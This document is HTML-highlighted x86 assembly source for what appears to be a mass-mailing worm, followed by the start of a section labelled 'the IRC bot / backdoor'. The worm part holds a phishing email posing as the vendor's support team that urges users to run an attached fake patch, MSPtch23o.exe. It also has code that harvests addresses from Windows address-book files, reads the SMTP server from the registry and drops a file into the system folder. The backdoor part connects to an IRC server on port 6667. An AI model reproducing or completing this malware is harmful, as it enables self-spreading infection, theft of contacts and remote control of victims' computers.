                </span><span class="sc6">stosw</span><span class="sc0">
                                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Beatsmtpbuffer</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                                </span><span class="sc6">pushad</span><span class="sc0">
                                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sendstring</span><span class="sc0">
                                </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">;Again to smtpbuffer start</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">BeatCounter</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
                
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">BeatNotReady</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">put_new_line</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0Ah</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">TranslateTbl</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc4">,</span><span class="sc12">'B'</span><span class="sc4">,</span><span class="sc12">'C'</span><span class="sc4">,</span><span class="sc12">'D'</span><span class="sc4">,</span><span class="sc12">'E'</span><span class="sc4">,</span><span class="sc12">'F'</span><span class="sc4">,</span><span class="sc12">'G'</span><span class="sc4">,</span><span class="sc12">'H'</span><span class="sc4">,</span><span class="sc12">'I'</span><span class="sc4">,</span><span class="sc12">'J'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'K'</span><span class="sc4">,</span><span class="sc12">'L'</span><span class="sc4">,</span><span class="sc12">'M'</span><span class="sc4">,</span><span class="sc12">'N'</span><span class="sc4">,</span><span class="sc12">'O'</span><span class="sc4">,</span><span class="sc12">'P'</span><span class="sc4">,</span><span class="sc12">'Q'</span><span class="sc4">,</span><span class="sc12">'R'</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc4">,</span><span class="sc12">'T'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'U'</span><span class="sc4">,</span><span class="sc12">'V'</span><span class="sc4">,</span><span class="sc12">'W'</span><span class="sc4">,</span><span class="sc12">'X'</span><span class="sc4">,</span><span class="sc12">'Y'</span><span class="sc4">,</span><span class="sc12">'Z'</span><span class="sc4">,</span><span class="sc12">'a'</span><span class="sc4">,</span><span class="sc12">'b'</span><span class="sc4">,</span><span class="sc12">'c'</span><span class="sc4">,</span><span class="sc12">'d'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'e'</span><span class="sc4">,</span><span class="sc12">'f'</span><span class="sc4">,</span><span class="sc12">'g'</span><span class="sc4">,</span><span class="sc12">'h'</span><span class="sc4">,</span><span class="sc12">'i'</span><span class="sc4">,</span><span class="sc12">'j'</span><span class="sc4">,</span><span class="sc12">'k'</span><span class="sc4">,</span><span class="sc12">'l'</span><span class="sc4">,</span><span class="sc12">'m'</span><span class="sc4">,</span><span class="sc12">'n'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'o'</span><span class="sc4">,</span><span class="sc12">'p'</span><span class="sc4">,</span><span class="sc12">'q'</span><span class="sc4">,</span><span class="sc12">'r'</span><span class="sc4">,</span><span class="sc12">'s'</span><span class="sc4">,</span><span class="sc12">'t'</span><span class="sc4">,</span><span class="sc12">'u'</span><span class="sc4">,</span><span class="sc12">'v'</span><span class="sc4">,</span><span class="sc12">'w'</span><span class="sc4">,</span><span class="sc12">'x'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'y'</span><span class="sc4">,</span><span class="sc12">'z'</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc4">,</span><span class="sc12">'1'</span><span class="sc4">,</span><span class="sc12">'2'</span><span class="sc4">,</span><span class="sc12">'3'</span><span class="sc4">,</span><span class="sc12">'4'</span><span class="sc4">,</span><span class="sc12">'5'</span><span class="sc4">,</span><span class="sc12">'6'</span><span class="sc4">,</span><span class="sc12">'7'</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'8'</span><span class="sc4">,</span><span class="sc12">'9'</span><span class="sc4">,</span><span class="sc12">'+'</span><span class="sc4">,</span><span class="sc12">'/'</span><span class="sc0">

</span><span class="sc1">;------------------------------------------------------------------------------</span><span class="sc0">


</span><span class="sc1">;MailHeader</span><span class="sc0">
</span><span class="sc5">mailh</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"helo tfosorcim"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"mail from: support@tfosorcim.com"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"rcpt to: lifewire@mail.ru"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"data"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;MailBody</span><span class="sc0">
</span><span class="sc5">mailb</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"from: ""tfosorcim Support"" &lt;Support@tfosorcim.com&gt;"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"to: lifewire@mail.ru"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">;&lt;-- paste here the add from wab</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"subject: Outlook Bugfix"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"MIME-Version: 1.0"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Content-Type: multipart/mixed; boundary="'</span><span class="sc0">
</span><span class="sc5">mnxtprt</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'----=_NextPart_000_632dae5f_24854b47$706cd918'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'"'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"This is a multi-part message in MIME format."</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">

</span><span class="sc1">;TEXT BOUNDRARY</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"--"</span><span class="sc0">            </span><span class="sc1">;has to be 2 -'s extra</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">     </span><span class="sc1">;put boundrary here</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"Content-Type: text/plain; format=flowed"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">


        </span><span class="sc1">;thx to Ruzz` for being english ;)</span><span class="sc0">

</span><span class="sc1">;TEXT part</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Dear Customer,"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"As you may or may not know, several viruses and worms attack your"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"computer by using problems in tfosorcim Outlook and Outlook Express."</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"tfosorcim Support Team recently released a bug-fix that patches up"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"this problem and prevents the spreading of all suspicious programs,"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"including undetected viruses."</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"After the patch has been installed, Outlook and Outlook Express will"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"still function as normal."</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"If you have not already downloaded and installed this patch, please"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"execute the attached file which will automatically download and"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"install the relevant files."</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"For further questions, please visit to www.tfosorcim.com."</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Regards,"</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">""</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"tfosorcim Support Team."</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">



</span><span class="sc1">;ATTACHMENT BOUNDRARY</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"--"</span><span class="sc0">            </span><span class="sc1">;has to be 2 -'s extra</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">     </span><span class="sc1">;put boundrary here</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Content-Type: application/x-zip-compressed; name="MSPtch23o.exe"'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Content-Transfer-Encoding: base64'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Content-Disposition: attachment; filename="MSPtch23o.exe"'</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc1">;ATTACHMENT</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">3h</span><span class="sc0">
        
</span><span class="sc1">;END BOUNDRARY</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc3">"--"</span><span class="sc0">            </span><span class="sc1">;has to be 2 -'s extra</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc0">

</span><span class="sc5">eofmail</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"."</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0ah</span><span class="sc4">,</span><span class="sc12">'QUIT'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">

</span><span class="sc5">nametoopen</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"Software\Microsoft\Internet Account Manager\Accounts\00000001"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">valuename</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"SMTP Server"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">wabfilemask</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"\Application Data\Microsoft\Address Book\*.wab"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">wabfilemasksize</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">wabfilemask</span><span class="sc0">

</span><span class="sc5">dropperInname</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"system\icwscrpt.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">maxvaluesize</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">72</span><span class="sc0">

</span><span class="sc1">;----------------------------</span><span class="sc0">

</span><span class="sc5">leeg</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">keyhandle</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc5">conn_socket</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">WSAData</span><span class="sc0">         </span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sockaddrin</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">sockaddr_in</span><span class="sc0">     </span><span class="sc5">ssockaddr_in</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">sinsize</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sockaddrin</span><span class="sc0">

</span><span class="sc5">dropperfh</span><span class="sc0">       </span><span class="sc5">filehandles</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">BeatCounter</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">Beatsmtpbuffer</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">50h</span><span class="sc4">*</span><span class="sc2">08h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">addybuffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">32</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">;max size of addy from wab</span><span class="sc0">

</span><span class="sc5">smtpbuffer</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">432</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">smtpfindstructure</span><span class="sc0">   </span><span class="sc5">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">_CODE</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'DATA'</span><span class="sc0">
</span><span class="sc5">fill</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">_DATA</span><span class="sc0">   </span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ</span><span class="sc0">
</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc1">; the IRC bot / backdoor</span><span class="sc0">

</span><span class="sc2">.486p</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">WSAStartup</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;            </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">WSACleanup</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;            </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">htons</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;                 </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">socket</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;                </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">connect</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;               </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">inet_addr</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;             </span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">send</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">recv</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">closesocket</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">GetTickCount</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc1">;</span><span class="sc0">
        
</span><span class="sc5">WSADESCRIPTION_LEN</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">256d</span><span class="sc0">
</span><span class="sc5">WSASYS_STATUS_LEN</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">128d</span><span class="sc0">
</span><span class="sc5">AF_INET</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">2d</span><span class="sc0">

</span><span class="sc5">portno</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">6667</span><span class="sc0">


</span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
  </span><span class="sc5">wVersion</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">wHighVersion</span><span class="sc0">  </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">szDescription</span><span class="sc0"> </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc5">WSADESCRIPTION_LEN</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">szSystemStatus</span><span class="sc0">  </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc5">WSASYS_STATUS_LEN</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
  </span><span class="sc5">iMaxSockets</span><span class="sc0">   </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">iMaxUdpDg</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">lpVendorInfo</span><span class="sc0">  </span><span class="sc10">DWORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">WSADATA</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">


</span><span class="sc5">ssockaddr_in</span><span class="sc0"> </span><span class="sc9">STRUCT</span><span class="sc0">
  </span><span class="sc5">sin_family</span><span class="sc0">    </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0">
  </span><span class="sc5">sin_port</span><span class="sc0">      </span><span class="sc10">WORD</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">sin_addr</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0">   </span><span class="sc10">?</span><span class="sc0">
  </span><span class="sc5">sin_zero</span><span class="sc0">      </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">ssockaddr_in</span><span class="sc0"> </span><span class="sc9">ENDS</span><span class="sc0">



</span><span class="sc1">;----------------------------------------------------------------------------;</span><span class="sc0">
</span><span class="sc5">_CODE</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">use32</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ip</span><span class="sc4">]</span><span class="sc0">                    </span><span class="sc1">;IP to connect</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">6667</span><span class="sc0">                        </span><span class="sc1">;port</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Connect</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">exit</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">IRC_nick</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">buffer</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">                           </span><span class="sc1">;create some nick</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RndChar</span><span class="sc0"> 

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0dh</span><span class="sc0">                          </span><span class="sc1">;CR</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">;esi points to USER</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;store</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RndChar</span><span class="sc0">                              </span><span class="sc1">;9 chars before hostname</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RndChar</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">' '</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RndChar</span><span class="sc0"> 
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">': '</span><span class="sc0">
